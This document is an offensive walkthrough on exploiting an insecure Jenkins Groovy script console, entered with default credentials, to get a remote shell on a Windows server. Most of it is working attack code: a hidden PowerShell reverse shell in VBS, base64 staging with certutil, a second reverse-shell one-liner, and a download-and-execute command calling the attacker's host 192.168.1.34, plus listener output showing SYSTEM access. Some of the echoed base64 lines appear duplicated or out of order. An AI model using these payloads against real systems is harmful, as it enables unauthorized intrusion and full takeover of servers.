========================================================================================================================
Basic ways to manually exploit a RCE flaw and obtain a remote shell on a Windows server 
========================================================================================================================

Basic Examples with an insecure Jenkins.

=> How to get a remote shell on a Windows server by exploiting a Jenkins groovy script console (RCE) 

Find an insecure Jenkins server whith default admin credentials (admin:password).
Objective: Use the Jenkins groovy script console that allows to execute OS commands to get a remote shell on the underlying Windows server.
Example URL: http://192.168.1.50/jenkins/script


Example 1
==========

1. Use a classic PowerShell reverse shell embedded in a VBS script
------------------------------------------------------------------
Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
strArgs = "powershell -NoP -NonI -W Hidden -Exec Bypass ""& {$ps=$false;$hostip='192.168.1.34';$port=443;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"""
oShell.Run strArgs, 0, false


2. Encode it in Base64 using Certutil.exe
--------------------------------------------------------------------
C:\Users\user\Documents>certutil -encode test.vbs test-encode
Input Length = 1128
Output Length = 1608
CertUtil: -encode command completed successfully.

-----BEGIN CERTIFICATE-----
U2V0IG9TaGVsbCA9IENyZWF0ZU9iamVjdCAoIldzY3JpcHQuU2hlbGwiKSANCkRp
bSBzdHJBcmdzDQpzdHJBcmdzID0gInBvd2Vyc2hlbGwgLU5vUCAtTm9uSSAtVyBI
aWRkZW4gLUV4ZWMgQnlwYXNzICIiJiB7JHBzPSRmYWxzZTskaG9zdGlwPScxOTIu
MTY4LjEuMzQnOyRwb3J0PTQ0MzskY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0u
TmV0LlNvY2tldHMuVENQQ2xpZW50KCRob3N0aXAsJHBvcnQpOyRzdHJlYW0gPSAk
Y2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNTAwMDB8JXsw
fTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVu
Z3RoKSkgLW5lIDApeyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3Rl
bS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRj
bWQ9KGdldC1jaGlsZGl0ZW0gRW52OkNvbVNwZWMpLnZhbHVlOyRpbkFycmF5PSRk
YXRhLnNwbGl0KCk7JGl0ZW09JGluQXJyYXlbMF07aWYoKCRpdGVtIC1lcSAnJHBz
JykgLWFuZCAoJHBzIC1lcSAkZmFsc2UpKXskcHM9JHRydWV9aWYoJGl0ZW0gLWxp
a2UgJz86Jyl7JGl0ZW09J2Q6J30kbXlBcnJheT1AKCdjZCcsJ2V4aXQnLCdkOics
J3B3ZCcsJ2xzJywncHMnLCdybScsJ2NwJywnbXYnLCdjYXQnKTskZG89JGZhbHNl
O2ZvcmVhY2ggKCRpIGluICRteUFycmF5KXtpZigkaXRlbSAtZXEgJGkpeyRkbz0k
dHJ1ZX19aWYoJGRvIC1vciAkcHMpeyRzZW5kYmFjaz0oIGlleCAkZGF0YSAyPiYx
IHxPdXQtU3RyaW5nKX1lbHNleyRkYXRhMj0nL2MgJyskZGF0YTskc2VuZGJhY2sg
PSAoICYkY21kICRkYXRhMiAyPiYxIHwgT3V0LVN0cmluZyl9O2lmKCRwcyl7JHBy
b21wdD0nUFMgJyArIChwd2QpLlBhdGh9ZWxzZXskcHJvbXB0PShwd2QpLlBhdGh9
JHNlbmRiYWNrMiA9ICRkYXRhICsgJHNlbmRiYWNrICsgJHByb21wdCArICc+ICc7
JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRz
ZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxl
bmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCl9IiIiDQpvU2hl
bGwuUnVuIHN0ckFyZ3MsIDAsIGZhbHNl
-----END CERTIFICATE-----

3. Write the Base64 encoded reverse shell using the RCE in Jenkins
------------------------------------------------------------------

URL: http://192.168.1.50/jenkins/script / Creds: admin:password

print "cmd /c echo -----BEGIN CERTIFICATE----- >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo U2V0IG9TaGVsbCA9IENyZWF0ZU9iamVjdCAoIldzY3JpcHQuU2hlbGwiKSANCkRp >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo bSBzdHJBcmdzDQpzdHJBcmdzID0gInBvd2Vyc2hlbGwgLU5vUCAtTm9uSSAtVyBI >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo aWRkZW4gLUV4ZWMgQnlwYXNzICIiJiB7JHBzPSRmYWxzZTskaG9zdGlwPScxOTIu >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo MTY4LjEuMzQnOyRwb3J0PTQ0MzskY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0u >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo TmV0LlNvY2tldHMuVENQQ2xpZW50KCRob3N0aXAsJHBvcnQpOyRzdHJlYW0gPSAk >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo Y2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNTAwMDB8JXsw >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo fTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVu >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo Z3RoKSkgLW5lIDApeyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3Rl >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo bS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRj >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo bWQ9KGdldC1jaGlsZGl0ZW0gRW52OkNvbVNwZWMpLnZhbHVlOyRpbkFycmF5PSRk >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo YXRhLnNwbGl0KCk7JGl0ZW09JGluQXJyYXlbMF07aWYoKCRpdGVtIC1lcSAnJHBz >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo JykgLWFuZCAoJHBzIC1lcSAkZmFsc2UpKXskcHM9JHRydWV9aWYoJGl0ZW0gLWxp >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo a2UgJz86Jyl7JGl0ZW09J2Q6J30kbXlBcnJheT1AKCdjZCcsJ2V4aXQnLCdkOics >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo J3B3ZCcsJ2xzJywncHMnLCdybScsJ2NwJywnbXYnLCdjYXQnKTskZG89JGZhbHNl >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo a2UgJz86Jyl7JGl0ZW09J2Q6J30kbXlBcnJheT1AKCdjZCcsJ2V4aXQnLCdkOics >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo O2ZvcmVhY2ggKCRpIGluICRteUFycmF5KXtpZigkaXRlbSAtZXEgJGkpeyRkbz0k >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo a2UgJz86Jyl7JGl0ZW09J2Q6J30kbXlBcnJheT1AKCdjZCcsJ2V4aXQnLCdkOics >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo dHJ1ZX19aWYoJGRvIC1vciAkcHMpeyRzZW5kYmFjaz0oIGlleCAkZGF0YSAyPiYx >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo IHxPdXQtU3RyaW5nKX1lbHNleyRkYXRhMj0nL2MgJyskZGF0YTskc2VuZGJhY2sg >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo PSAoICYkY21kICRkYXRhMiAyPiYxIHwgT3V0LVN0cmluZyl9O2lmKCRwcyl7JHBy >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo b21wdD0nUFMgJyArIChwd2QpLlBhdGh9ZWxzZXskcHJvbXB0PShwd2QpLlBhdGh9 >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo JHNlbmRiYWNrMiA9ICRkYXRhICsgJHNlbmRiYWNrICsgJHByb21wdCArICc+ICc7 >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRz >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo ZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxl >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo bmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCl9IiIiDQpvU2hl >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo bGwuUnVuIHN0ckFyZ3MsIDAsIGZhbHNl >> C:\\Temp\\test-encode".execute().text 
print "cmd /c echo -----END CERTIFICATE----- >> C:\\Temp\\test-encode".execute().text 

Note: we can check that it worked 
print "cmd /c type C:\\Temp\\test-encode".execute().text


4. Decode the Base64 encoded reverse shell using the RCE in Jenkins
--------------------------------------------------------------------------------------------------
print "cmd /c certutil -decode C:\\Temp\\test-encode C:\\Temp\\test.vbs".execute().text 

Result
Input Length = 1608
Output Length = 1128
CertUtil: -decode command completed successfully.

Note: we can check that it worked 
---------------------------------
print "cmd /c type C:\\Temp\\test.vbs".execute().text 

Result
Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
strArgs = "powershell -NoP -NonI -W Hidden -Exec Bypass ""& {$ps=$false;$hostip='192.168.1.34';$port=443;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"""
oShell.Run strArgs, 0, false


5. Execute the reverse shell using the RCE in jenkins
--------------------------------------------------------------------------------------------------
print "cmd /c C:\\Temp\\test.vbs".execute().text 


5.bis Run a netcat listener and obtain a reverse shell on the box  => Powned !
--------------------------------------------------------------------------------------------------
jeff@kali-Linux:~/Documents/Windows-training/powercat$ sudo nc -nlvp 443
[sudo] password for jeff: 

listening on [any] 443 ...
connect to [192.168.1.34] from (UNKNOWN) [192.168.1.50] 49294

systeminfo
systeminfo

Host Name:                 WIN-EVAGJ1T16QD
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-00110-49040-AA454
Original Install Date:     6/12/2018, 4:12:08 AM
System Boot Time:          3/24/2020, 11:06:13 PM
System Manufacturer:       innotek GmbH
System Model:              VirtualBox
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 70 Stepping 1 GenuineIntel ~2195 Mhz
BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              fr;French (France)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,096 MB
Available Physical Memory: 2,582 MB
Virtual Memory: Max Size:  4,800 MB
Virtual Memory: Available: 3,385 MB
Virtual Memory: In Use:    1,415 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 161 Hotfix(s) Installed.
                           [01]: KB2843630
                           [02]: KB2862152
                           [03]: KB2868626
                           [04]: KB2883200
                           [05]: KB2884846
<snip>


Other - PS reverse shell that works well
-----------------------------------------
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.34',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"



Example 2
=========
1. Use a classic PowerShell reverse shell embedded in a VBS script
------------------------------------------------------------------
Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
strArgs = "powershell -NoP -NonI -W Hidden -Exec Bypass ""& {$ps=$false;$hostip='192.168.1.34';$port=443;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"""
oShell.Run strArgs, 0, false


2. Run a PowerShell command to download and execute the reverse shell using the RCE in jenkins 
-----------------------------------------------------------------------------------------------

print "cmd /c powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.34/test.vbs','test.vbs');Start-Process 'test.vbs'".execute().text 


3. Run a netcat listener and obtain a reverse shell on the box => :-)
--------------------------------------------------------------------------------------------------
jeff@kali-Linux:~/Documents/Windows-training/powercat$ sudo nc -nlvp 443
[sudo] password for jeff: 

listening on [any] 443 ...
connect to [192.168.1.34] from (UNKNOWN) [192.168.1.50] 49490

whoami
whoami

nt authority\system
